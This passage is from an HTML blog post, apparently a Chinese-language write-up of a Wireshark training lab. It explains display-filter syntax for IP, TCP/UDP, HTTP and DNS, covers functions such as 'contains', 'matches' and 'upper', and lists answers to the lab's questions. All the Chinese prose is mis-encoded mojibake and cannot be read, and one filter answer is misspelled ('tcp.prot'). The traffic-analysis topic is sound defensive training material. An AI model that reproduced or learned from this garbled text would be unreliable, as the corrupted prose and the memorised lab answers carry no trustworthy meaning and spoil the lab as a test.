10.10.10.111)</code></td>\n</tr>\n<tr>\n<td>ä¸æ˜¯</td>\n<td>!</td>\n<td>é€»è¾‘éž</td>\n<td><code>!(ip.src == 10.10.10.222)</code><br /><br /><strong>æ³¨æ„ï¼š</strong>å·²å¼ƒç”¨ æ­¤ç”¨æ³•<code>!=value</code> ï¼›ä½¿ç”¨å®ƒå¯èƒ½ä¼šå¯¼è‡´ç»“æžœä¸ä¸€è‡´ã€‚<code>!(value)</code> å»ºè®®ä½¿ç”¨å¦ä¸€ç§æ ·å¼ä»¥èŽ·å¾—æ›´ä¸€è‡´çš„ç»“æžœã€‚</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"æ•°æ®åŒ…è¿‡æ»¤å·¥å…·æ \">æ•°æ®åŒ…è¿‡æ»¤å·¥å…·æ </h5>\n<p>ç­›é€‰å·¥å…·æ ç”¨äºŽåˆ›å»ºå’Œåº”ç”¨æ˜¾ç¤ºç­›é€‰å™¨ã€‚å®ƒæ˜¯ä¸€ä¸ªæ™ºèƒ½å·¥å…·æ ï¼Œå¯å¸®åŠ©æ‚¨è½»æ¾åˆ›å»ºæœ‰æ•ˆçš„æ˜¾ç¤ºç­›é€‰å™¨ã€‚åœ¨å¼€å§‹ç­›é€‰æ•°æ®åŒ…ä¹‹å‰ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›æç¤ºï¼š</p>\n<ul>\n<li>æ•°æ®åŒ…è¿‡æ»¤å™¨ä»¥å°å†™å­—æ¯å®šä¹‰ã€‚</li>\n<li>æ•°æ®åŒ…è¿‡æ»¤å™¨å…·æœ‰è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ï¼Œå¯ä»¥åˆ†è§£åè®®ç»†èŠ‚ï¼Œæ¯ä¸ªç»†èŠ‚éƒ½ç”¨ä¸€ä¸ªâ€œç‚¹â€è¡¨ç¤ºã€‚</li>\n<li>æ•°æ®åŒ…è¿‡æ»¤å™¨é‡‡ç”¨ä¸‰è‰²è¡¨ç¤ºæ³•ï¼Œå…·ä½“è¯´æ˜Žå¦‚ä¸‹ã€‚</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>ç»¿è‰²çš„</strong></th>\n<th>æœ‰æ•ˆç­›é€‰å™¨</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>çº¢è‰²çš„</strong></td>\n<td>æ— æ•ˆç­›é€‰å™¨</td>\n</tr>\n<tr>\n<td><strong>é»„è‰²çš„</strong></td>\n<td>è­¦å‘Šï¼šæ­¤è¿‡æ»¤å™¨è™½ç„¶å¯ç”¨ï¼Œä½†å¹¶ä¸ç¨³å®šï¼Œå»ºè®®æ›´æ¢ä¸ºæœ‰æ•ˆçš„è¿‡æ»¤å™¨ã€‚</td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081244407-1613664507.png\" /></td>\n<td></td>\n</tr>\n<tr>\n<td>ç­›é€‰å·¥å…·æ åŠŸèƒ½å¦‚ä¸‹æ‰€ç¤ºã€‚</td>\n<td></td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081243969-1961969544.png\" /></td>\n<td></td>\n</tr>\n<tr>\n<td>æˆ‘ä»¬å·²ç»å­¦ä¹ äº†å¾ˆå¤šåŽŸç†å’Œè¯­æ³•ã€‚æŽ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬å°†è¿™äº›çŸ¥è¯†ä»˜è¯¸å®žè·µï¼Œå¼€å§‹åœ¨ä¸‹ä¸€ä¸ªä»»åŠ¡ä¸­è¿‡æ»¤æ•°æ®åŒ…ã€‚</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"æ•°æ®åŒ…è¿‡æ»¤--åè®®è¿‡æ»¤å™¨\">æ•°æ®åŒ…è¿‡æ»¤ | åè®®è¿‡æ»¤å™¨</h4>\n<p>å¦‚å‰æ–‡æ‰€è¿°ï¼ŒWireshark æ”¯æŒ 3000 ç§åè®®ï¼Œå¹¶å…è®¸é€šè¿‡è¿‡æ»¤åè®®å­—æ®µè¿›è¡Œæ•°æ®åŒ…çº§åˆ«çš„åˆ†æžã€‚æœ¬ä»»åŠ¡å°†æ¼”ç¤ºå¦‚ä½•åˆ›å»ºå’Œä½¿ç”¨é’ˆå¯¹ä¸åŒåè®®å­—æ®µçš„è¿‡æ»¤å™¨ã€‚</p>\n<h5 id=\"ipè¿‡æ»¤å™¨\">IPè¿‡æ»¤å™¨</h5>\n<p>IPè¿‡æ»¤å™¨å¸®åŠ©åˆ†æžäººå‘˜æ ¹æ®æ•°æ®åŒ…ä¸­çš„IPå±‚ä¿¡æ¯ï¼ˆOSIæ¨¡åž‹çš„ç½‘ç»œå±‚ï¼‰è¿‡æ»¤æµé‡ã€‚è¿™æ˜¯Wiresharkä¸­æœ€å¸¸ç”¨çš„è¿‡æ»¤å™¨ä¹‹ä¸€ã€‚è¿™äº›è¿‡æ»¤å™¨ä¼šè¿‡æ»¤ç½‘ç»œå±‚ä¿¡æ¯ï¼Œä¾‹å¦‚IPåœ°å€ã€ç‰ˆæœ¬ã€ç”Ÿå­˜æ—¶é—´ã€æœåŠ¡ç±»åž‹ã€æ ‡å¿—ä½å’Œæ ¡éªŒå’Œå€¼ã€‚</p>\n<p>å¸¸ç”¨ç­›é€‰æ¡ä»¶å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚</p>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th>æè¿°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>ip</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰IPæ•°æ®åŒ…ã€‚</td>\n</tr>\n<tr>\n<td><code>ip.addr == 10.10.10.111</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰åŒ…å« IP åœ°å€ 10.10.10.111 çš„æ•°æ®åŒ…ã€‚</td>\n</tr>\n<tr>\n<td><code>ip.addr == 10.10.10.0/24</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰åŒ…å«æ¥è‡ª 10.10.10.0/24 å­ç½‘çš„ IP åœ°å€çš„æ•°æ®åŒ…ã€‚</td>\n</tr>\n<tr>\n<td><code>ip.src == 10.10.10.111</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰æºè‡ª 10.10.10.111 çš„æ•°æ®åŒ…</td>\n</tr>\n<tr>\n<td><code>ip.dst == 10.10.10.111</code></td>\n<td>æ˜¾ç¤ºå‘é€åˆ° 10.10.10.111 çš„æ‰€æœ‰æ•°æ®åŒ…</td>\n</tr>\n<tr>\n<td>ip.addr <strong>ä¸Ž</strong> ip.src/ip.dst</td>\n<td><strong>æ³¨æ„ï¼š</strong>  ip.addr è¿‡æ»¤æµé‡æ—¶ä¸è€ƒè™‘æ•°æ®åŒ…æ–¹å‘ã€‚ip.src/ip.dst åˆ™æ ¹æ®æ•°æ®åŒ…æ–¹å‘è¿›è¡Œè¿‡æ»¤ã€‚</td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081243335-182061779.gif\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"tcp-å’Œ-udp-è¿‡æ»¤å™¨\">TCP å’Œ UDP è¿‡æ»¤å™¨</h5>\n<p>TCPè¿‡æ»¤å™¨å¸®åŠ©åˆ†æžäººå‘˜æ ¹æ®æ•°æ®åŒ…ä¸­çš„åè®®å±‚ä¿¡æ¯ï¼ˆOSIæ¨¡åž‹çš„ä¼ è¾“å±‚ï¼‰è¿‡æ»¤æµé‡ã€‚è¿™äº›è¿‡æ»¤å™¨ä¼šè¿‡æ»¤ä¼ è¾“åè®®å±‚çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æºç«¯å£å’Œç›®æ ‡ç«¯å£ã€åºåˆ—å·ã€ç¡®è®¤å·ã€çª—å£å¤§å°ã€æ—¶é—´æˆ³ã€æ ‡å¿—ã€é•¿åº¦å’Œåè®®é”™è¯¯ã€‚</p>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th>æè¿°</th>\n<th>ç­›é€‰</th>\n<th>è¡¨è¾¾</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>tcp.port == 80</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰ç«¯å£ä¸º 80 çš„ TCPæ•°æ®åŒ…</td>\n<td><code>udp.port == 53</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰ç«¯å£ä¸º 53 çš„UDPæ•°æ®åŒ…</td>\n</tr>\n<tr>\n<td><code>tcp.srcport == 1234</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰æºè‡ªç«¯å£ 1234 çš„TCPæ•°æ®åŒ…</td>\n<td><code>udp.srcport == 1234</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰æºè‡ªç«¯å£ 1234 çš„UDPæ•°æ®åŒ…</td>\n</tr>\n<tr>\n<td><code>tcp.dstport == 80</code></td>\n<td>æ˜¾ç¤ºå‘é€åˆ°ç«¯å£ 80 çš„æ‰€æœ‰TCPæ•°æ®åŒ…</td>\n<td><code>udp.dstport == 5353</code></td>\n<td>æ˜¾ç¤ºå‘é€åˆ°ç«¯å£ 5353 çš„æ‰€æœ‰UDPæ•°æ®åŒ…</td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081242082-492307879.gif\" /></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"åº”ç”¨å±‚åè®®è¿‡æ»¤å™¨--http-å’Œ-dns\">åº”ç”¨å±‚åè®®è¿‡æ»¤å™¨ | HTTP å’Œ DNS</h5>\n<p>åº”ç”¨å±‚åè®®è¿‡æ»¤å™¨å¸®åŠ©åˆ†æžäººå‘˜æ ¹æ®æ•°æ®åŒ…ä¸­çš„åº”ç”¨å±‚åè®®ä¿¡æ¯ï¼ˆOSI æ¨¡åž‹çš„åº”ç”¨å±‚ï¼‰è¿‡æ»¤æµé‡ã€‚è¿™äº›è¿‡æ»¤å™¨æ ¹æ®åè®®ç±»åž‹è¿‡æ»¤ç‰¹å®šäºŽåº”ç”¨å±‚çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æœ‰æ•ˆè½½è·å’Œé“¾è·¯æ•°æ®ã€‚</p>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th>æè¿°</th>\n<th>ç­›é€‰</th>\n<th>æè¿°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>http</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰HTTPæ•°æ®åŒ…</td>\n<td><code>dns</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰DNSæ•°æ®åŒ…</td>\n</tr>\n<tr>\n<td><code>http.response.code == 200</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰HTTPå“åº”ä»£ç ä¸ºâ€œ200â€çš„æ•°æ®åŒ…</td>\n<td><code>dns.flags.response == 0</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰DNSè¯·æ±‚</td>\n</tr>\n<tr>\n<td><code>http.request.method == \"GET\"</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰HTTP GET è¯·æ±‚</td>\n<td><code>dns.flags.response == 1</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰DNSå“åº”</td>\n</tr>\n<tr>\n<td><code>http.request.method == \"POST\"</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰HTTP POST è¯·æ±‚</td>\n<td><code>dns.qry.type == 1</code></td>\n<td>æ˜¾ç¤ºæ‰€æœ‰DNS â€œAâ€è®°å½•</td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081240576-1614070248.gif\" /></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"æ˜¾ç¤ºç­›é€‰è¡¨è¾¾å¼\">æ˜¾ç¤ºç­›é€‰è¡¨è¾¾å¼</h5>\n<p>å¦‚å‰æ‰€è¿°ï¼ŒWireshark å†…ç½®äº†ä¸€ä¸ªé€‰é¡¹ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼ï¼‰ï¼Œå…¶ä¸­å­˜å‚¨äº†æ‰€æœ‰å—æ”¯æŒçš„åè®®ç»“æž„ï¼Œä»¥å¸®åŠ©åˆ†æžäººå‘˜åˆ›å»ºæ˜¾ç¤ºè¿‡æ»¤å™¨ã€‚å½“åˆ†æžäººå‘˜è®°ä¸æ¸…ç‰¹å®šåè®®æ‰€éœ€çš„è¿‡æ»¤å™¨ï¼Œæˆ–è€…ä¸ç¡®å®šè¿‡æ»¤å™¨çš„å¯èµ‹å€¼æ—¶ï¼Œâ€œæ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼â€èœå•æä¾›äº†ä¸€ä¸ªæ˜“äºŽä½¿ç”¨çš„æ˜¾ç¤ºè¿‡æ»¤å™¨æž„å»ºæŒ‡å—ã€‚è¯¥ èœå•ä½äºŽ <strong>â€œåˆ†æž --&gt; æ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼â€</strong> ä¸‹ ã€‚</p>\n<p>è¦è®°ä½æ¯ç§åè®®çš„æ‰€æœ‰æ˜¾ç¤ºè¿‡æ»¤å™¨ç»†èŠ‚æ˜¯ä¸å¯èƒ½çš„ã€‚æ¯ç§åè®®éƒ½å¯èƒ½åŒ…å«ä¸åŒçš„å­—æ®µï¼Œå¹¶æŽ¥å—å„ç§ç±»åž‹çš„å€¼ã€‚<strong>â€œæ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼â€</strong> èœå•ä¼šæ˜¾ç¤ºæ‰€æœ‰åè®®å­—æ®µã€æŽ¥å—çš„å€¼ç±»åž‹ï¼ˆæ•´æ•°æˆ–å­—ç¬¦ä¸²ï¼‰ä»¥åŠé¢„å®šä¹‰å€¼ï¼ˆå¦‚æœ‰ï¼‰ã€‚è¯·æ³¨æ„ï¼ŒæŽŒæ¡åˆ›å»ºè¿‡æ»¤å™¨å’Œå­¦ä¹ åè®®è¿‡æ»¤å™¨å­—æ®µéœ€è¦æ—¶é—´å’Œç»ƒä¹ ã€‚<br />\nè¿™ç§å°±æ˜¯åœ¨ä½ ä¸çŸ¥é“æ€Žä¹ˆå†™è¯­æ³•è¿‡æ»¤çš„æ—¶å€™æ‰é€‰æ‹©è¿™ç§æ–¹å¼ï¼Œæ‰¾åè®®ï¼Œç„¶åŽè¿‡æ»¤ï¼Œæ‰€ä»¥è¯´æ‰ä¼šå«ä½ è‹¥ä¸æƒ³ç”¨è¿™ç§æ–¹å¼å°±éœ€è¦ä½ å¤§é‡ç»ƒä¹ ï¼Œäº†è§£è¯­æ³•<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/e88542e44c707050fbf654d9d62ed9eb.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>IPæ•°æ®åŒ…çš„æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ipå³å¯<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/ba26bbc8d015bdd7fc159a74c62b3127.png\" /></p>\n<pre><code class=\"language-python\">81420\n</code></pre>\n<p>TTL å€¼å°äºŽ 10 çš„æ•°æ®åŒ…æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>ip.ttl &lt; 10</code></p>\n<pre><code class=\"language-python\">66\n</code></pre>\n<p>ä½¿ç”¨â€œTCPç«¯å£4444â€çš„æ•°æ®åŒ…æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>tcp.prot == 4444</code></p>\n<pre><code class=\"language-python\">632\n</code></pre>\n<p>å‘é€åˆ°ç«¯å£â€œ80â€çš„â€œHTTP GETâ€è¯·æ±‚æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>tcp.port == 80 and http.request.method == GET</code><br />\næ³¨æ„ï¼šè¿™ä¸ªGETä¸€å®šè¦å¤§å†™ï¼Œå°å†™è¯•è¿‡äº†ï¼Œä¸è¡Œ</p>\n<pre><code class=\"language-python\">527\n</code></pre>\n<p>Aç±»DNSæŸ¥è¯¢çš„æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>dns.a</code></p>\n<pre><code class=\"language-python\">51\n</code></pre>\n<h4 id=\"é«˜çº§ç­›é€‰\">é«˜çº§ç­›é€‰</h4>\n<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ‚¨å·²ç»å­¦ä¹ äº†æ•°æ®åŒ…è¿‡æ»¤æ“ä½œçš„åŸºç¡€çŸ¥è¯†ã€‚çŽ°åœ¨æ˜¯æ—¶å€™å…³æ³¨ç‰¹å®šäº‹ä»¶çš„æ•°æ®åŒ…ç»†èŠ‚äº†ã€‚é™¤äº†ä¸Šä¸€èŠ‚è¯¾ä»‹ç»çš„è¿ç®—ç¬¦å’Œè¡¨è¾¾å¼ä¹‹å¤–ï¼ŒWireshark è¿˜æä¾›äº†é«˜çº§è¿ç®—ç¬¦å’Œå‡½æ•°ã€‚è¿™äº›é«˜çº§è¿‡æ»¤é€‰é¡¹å¯ä»¥å¸®åŠ©åˆ†æžäººå‘˜å¯¹æ„Ÿå…´è¶£çš„äº‹ä»¶è¿›è¡Œæ·±å…¥åˆ†æžã€‚</p>\n<h5 id=\"ç­›é€‰æ¡ä»¶åŒ…å«\">ç­›é€‰æ¡ä»¶ï¼šâ€œåŒ…å«â€</h5>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th><strong>åŒ…å«</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>ç±»åž‹</strong></td>\n<td>æ¯”è¾ƒç®—å­</td>\n</tr>\n<tr>\n<td><strong>æè¿°</strong></td>\n<td>åœ¨æ•°æ®åŒ…ä¸­æœç´¢å€¼ã€‚å®ƒåŒºåˆ†å¤§å°å†™ï¼Œå¹¶é€šè¿‡èšç„¦äºŽç‰¹å®šå­—æ®µæä¾›ç±»ä¼¼äºŽâ€œæŸ¥æ‰¾â€é€‰é¡¹çš„åŠŸèƒ½ã€‚</td>\n</tr>\n<tr>\n<td><strong>ä¾‹å­</strong></td>\n<td>æŸ¥æ‰¾æ‰€æœ‰â€œ Apache â€æœåŠ¡å™¨ã€‚</td>\n</tr>\n<tr>\n<td><strong>å·¥ä½œæµç¨‹</strong></td>\n<td>åˆ—å‡ºæ‰€æœ‰HTTPæ•°æ®åŒ…ï¼Œå…¶ä¸­æ•°æ®åŒ…çš„â€œserverâ€å­—æ®µåŒ…å«â€œ Apache â€å…³é”®å­—ã€‚</td>\n</tr>\n<tr>\n<td><strong>ç”¨æ³•</strong></td>\n<td><code>http.server contains \"Apache\"</code></td>\n</tr>\n<tr>\n<td><img alt=\"600\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081239180-1960349052.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"ç­›é€‰æ¡ä»¶åŒ¹é…\">ç­›é€‰æ¡ä»¶ï¼šâ€œåŒ¹é…â€</h5>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th><strong>æ¯”èµ›</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ç±»åž‹</td>\n<td>æ¯”è¾ƒç®—å­</td>\n</tr>\n<tr>\n<td>æè¿°</td>\n<td>æœç´¢ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„å†…å®¹ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†å¤æ‚æŸ¥è¯¢å­˜åœ¨ä¸€å®šçš„è¯¯å·®èŒƒå›´ã€‚</td>\n</tr>\n<tr>\n<td><strong>ä¾‹å­</strong></td>\n<td>æŸ¥æ‰¾æ‰€æœ‰ .php å’Œ .html é¡µé¢ã€‚</td>\n</tr>\n<tr>\n<td>å·¥ä½œæµç¨‹</td>\n<td>åˆ—å‡ºæ‰€æœ‰  HTTP æ•°æ®åŒ…ï¼Œå…¶ä¸­æ•°æ®åŒ…çš„â€œhostâ€å­—æ®µä¸Žå…³é”®å­—â€œ.phpâ€æˆ–â€œ.htmlâ€åŒ¹é…ã€‚</td>\n</tr>\n<tr>\n<td><strong>ç”¨æ³•</strong></td>\n<td><code>http.host matches \"\\.(php|html)\"</code></td>\n</tr>\n<tr>\n<td><img alt=\"600\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081238675-1715347653.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"ç­›é€‰æ¡ä»¶in\">ç­›é€‰æ¡ä»¶ï¼šâ€œinâ€</h5>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th><strong>åœ¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ç±»åž‹</td>\n<td>æˆå‘˜èµ„æ ¼</td>\n</tr>\n<tr>\n<td>æè¿°</td>\n<td>åœ¨ç‰¹å®šèŒƒå›´/èŒƒå›´å†…æœç´¢å€¼æˆ–å­—æ®µã€‚</td>\n</tr>\n<tr>\n<td>ä¾‹å­</td>\n<td>æŸ¥æ‰¾æ‰€æœ‰ä½¿ç”¨ç«¯å£ 80ã€443 æˆ– 8080 çš„æ•°æ®åŒ…ã€‚</td>\n</tr>\n<tr>\n<td>å·¥ä½œæµç¨‹</td>\n<td>åˆ—å‡ºæ‰€æœ‰ TCP æ•°æ®åŒ…ï¼Œå…¶ä¸­æ•°æ®åŒ…çš„â€œç«¯å£â€å­—æ®µçš„å€¼ä¸º 80ã€443 æˆ– 8080ã€‚</td>\n</tr>\n<tr>\n<td>ç”¨æ³•</td>\n<td><code>tcp.port in {80 443 8080}</code></td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"600\" src=\"https://i-blog.csdnimg.cn/img_convert/8b9447d0b8958386eab7006f9cafac9c.png\" /></p>\n<h5 id=\"ç­›é€‰æ¡ä»¶å¤§å†™\">ç­›é€‰æ¡ä»¶ï¼šâ€œå¤§å†™â€</h5>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th><strong>å¤§å†™</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ç±»åž‹</td>\n<td>åŠŸèƒ½</td>\n</tr>\n<tr>\n<td>æè¿°</td>\n<td>å°†å­—ç¬¦ä¸²å€¼è½¬æ¢ä¸ºå¤§å†™ã€‚</td>\n</tr>\n<tr>\n<td>ä¾‹å­</td>\n<td>æŸ¥æ‰¾æ‰€æœ‰â€œAPACHEâ€æœåŠ¡å™¨ã€‚</td>\n</tr>\n<tr>\n<td>å·¥ä½œæµç¨‹</td>\n<td>å°†æ‰€æœ‰  HTTP æ•°æ®åŒ…çš„â€œserverâ€å­—æ®µè½¬æ¢ä¸ºå¤§å†™ï¼Œå¹¶åˆ—å‡ºåŒ…å«â€œAPACHEâ€å…³é”®å­—çš„æ•°æ®åŒ…ã€‚</td>\n</tr>\n<tr>\n<td>ç”¨æ³•</td>\n<td><code>upper(http.server) contains \"APACHE\"</code></td>\n</tr>\n<tr>\n<td><img alt=\"600\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081237720-700087188.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"ç­›é€‰æ¡ä»¶å°å†™\">ç­›é€‰æ¡ä»¶ï¼šâ€œå°å†™â€</h4>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th><strong>å°å†™</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ç±»åž‹</td>\n<td>åŠŸèƒ½</td>\n</tr>\n<tr>\n<td>æè¿°</td>\n<td>å°†å­—ç¬¦ä¸²å€¼è½¬æ¢ä¸ºå°å†™ã€‚</td>\n</tr>\n<tr>\n<td>ä¾‹å­</td>\n<td>æŸ¥æ‰¾æ‰€æœ‰â€œ apache â€æœåŠ¡å™¨ã€‚</td>\n</tr>\n<tr>\n<td>å·¥ä½œæµç¨‹</td>\n<td>å°†æ‰€æœ‰  HTTP æ•°æ®åŒ…çš„â€œserverâ€å­—æ®µä¿¡æ¯è½¬æ¢ä¸ºå°å†™ï¼Œå¹¶åˆ—å‡ºåŒ…å«â€œ apache â€å…³é”®å­—çš„æ•°æ®åŒ…ã€‚</td>\n</tr>\n<tr>\n<td><strong>ç”¨æ³•</strong></td>\n<td><code>lower(http.server) contains \"apache\"</code></td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"600\" src=\"https://i-blog.csdnimg.cn/img_convert/80510b742b8d628c36450ba815cc9328.png\" /></p>\n<h5 id=\"ç­›é€‰æ¡ä»¶è½¬å­—ç¬¦ä¸²åŒ¹é…\">ç­›é€‰æ¡ä»¶ï¼šâ€œè½¬å­—ç¬¦ä¸²åŒ¹é…â€</h5>\n<table>\n<thead>\n<tr>\n<th>ç­›é€‰</th>\n<th><strong>è½¬å­—ç¬¦ä¸²åŒ¹é…</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ç±»åž‹</td>\n<td>åŠŸèƒ½</td>\n</tr>\n<tr>\n<td>æè¿°</td>\n<td>å°†éžå­—ç¬¦ä¸²å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</td>\n</tr>\n<tr>\n<td>ä¾‹å­</td>\n<td>æ‰¾å‡ºæ‰€æœ‰æ•°å­—ä¸ºå¥‡æ•°çš„å¸§ã€‚</td>\n</tr>\n<tr>\n<td>å·¥ä½œæµç¨‹</td>\n<td>å°†æ‰€æœ‰â€œå¸§ç¼–å·â€å­—æ®µè½¬æ¢ä¸ºå­—ç¬¦ä¸²å€¼ï¼Œå¹¶å°†å¸§åˆ—è¡¨ä»¥å¥‡æ•°å€¼ç»“å°¾ã€‚</td>\n</tr>\n<tr>\n<td>ç”¨æ³•</td>\n<td><code>string(frame.number) matches \"[13579]$\"</code></td>\n</tr>\n<tr>\n<td><img alt=\"600\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081236695-1149699087.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"ä¹¦ç­¾å’Œç­›é€‰æŒ‰é’®\">ä¹¦ç­¾å’Œç­›é€‰æŒ‰é’®</h5>\n<p>æˆ‘ä»¬å·²ç»ä»‹ç»äº†å„ç§ç­›é€‰é€‰é¡¹ã€è¿ç®—ç¬¦å’Œå‡½æ•°ã€‚çŽ°åœ¨æ˜¯æ—¶å€™åˆ›å»ºç­›é€‰å™¨å¹¶å°†å…¶ä¿å­˜ä¸ºä¹¦ç­¾å’ŒæŒ‰é’®ï¼Œä»¥ä¾¿æ—¥åŽä½¿ç”¨ã€‚å¦‚å‰æ‰€è¿°ï¼Œç­›é€‰å·¥å…·æ æœ‰ä¸€ä¸ªç­›é€‰ä¹¦ç­¾éƒ¨åˆ†ï¼Œç”¨äºŽä¿å­˜ç”¨æˆ·åˆ›å»ºçš„ç­›é€‰å™¨ï¼Œè¿™æœ‰åŠ©äºŽåˆ†æžå¸ˆåªéœ€ç‚¹å‡»å‡ ä¸‹å³å¯é‡å¤ä½¿ç”¨å¸¸ç”¨æˆ–å¤æ‚çš„ç­›é€‰å™¨ã€‚ä¸Žä¹¦ç­¾ç±»ä¼¼ï¼Œæ‚¨ä¹Ÿå¯ä»¥åˆ›å»ºç­›é€‰æŒ‰é’®ï¼Œåªéœ€å•å‡»ä¸€ä¸‹å³å¯åº”ç”¨ã€‚</p>\n<p>åˆ›å»ºå’Œä½¿ç”¨ä¹¦ç­¾ï¼š<br />\n<img alt=\"600\" src=\"https://i-blog.csdnimg.cn/img_convert/cf16a852caa84b422fd905318186b501.png\" /></p>\n<p>åˆ›å»ºå’Œä½¿ç”¨æ˜¾ç¤ºç­›é€‰æŒ‰é’®ï¼š<br />\n<img alt=\"700\" src=\"https://i-blog.csdnimg.cn/img_convert/65434fd5a964a3c38289f0f2846f4948.png\" /></p>\n<h5 id=\"ç®€ä»‹\">ç®€ä»‹</h5>\n<p>Wireshark æ˜¯ä¸€æ¬¾å¤šåŠŸèƒ½å·¥å…·ï¼Œå¯å¸®åŠ©åˆ†æžäººå‘˜è¿›è¡Œæ·±å…¥çš„æ•°æ®åŒ…åˆ†æžã€‚æ­£å¦‚æˆ‘ä»¬åœ¨è®¨è®ºä¸­æåˆ°çš„ï¼Œåˆ†æžç‰¹å®šäº‹ä»¶éœ€è¦é…ç½®å¤šä¸ªåå¥½è®¾ç½®ã€‚å¦‚æžœæ¯æ¬¡è°ƒæŸ¥éƒ½éœ€è¦é‡æ–°æ›´æ”¹é…ç½®ï¼Œè¿™éžå¸¸ç¹çï¼Œå› ä¸ºæ¯ä¸ªæ¡ˆä¾‹éƒ½éœ€è¦ä¸åŒçš„é¢œè‰²è§„åˆ™å’Œè¿‡æ»¤æŒ‰é’®ã€‚è¿™æ—¶ï¼ŒWireshark é…ç½®æ–‡ä»¶å°±æ´¾ä¸Šäº†ç”¨åœºã€‚æ‚¨å¯ä»¥ä¸ºä¸åŒçš„è°ƒæŸ¥æ¡ˆä¾‹åˆ›å»ºå¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œå¹¶æ 